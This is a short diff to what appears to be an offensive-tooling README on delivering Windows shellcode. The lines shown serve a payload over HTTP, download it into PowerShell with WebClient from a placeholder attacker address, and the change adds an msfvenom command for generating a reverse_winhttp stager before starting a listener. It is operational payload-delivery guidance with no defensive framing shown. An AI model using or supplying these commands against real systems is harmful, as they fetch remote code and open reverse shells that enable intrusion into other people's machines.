@@ -54,7 +54,7 @@ python3 -m http.server 80        # serve /tmp/sc.bin from this directory
 [Byte[]] $buf = (New-Object System.Net.WebClient).DownloadData('http://<IP>/sc.bin')
 ```
 
-For small shellcode (a stager), paste the bytes inline instead — see `sliver/README.md` §4 (staged payloads).
+For small shellcode (a stager), generate one with `msfvenom -p windows/x64/custom/reverse_winhttp ... -f ps1` and paste the output inline.
 
 **3. Start your listener:**
 ```bash
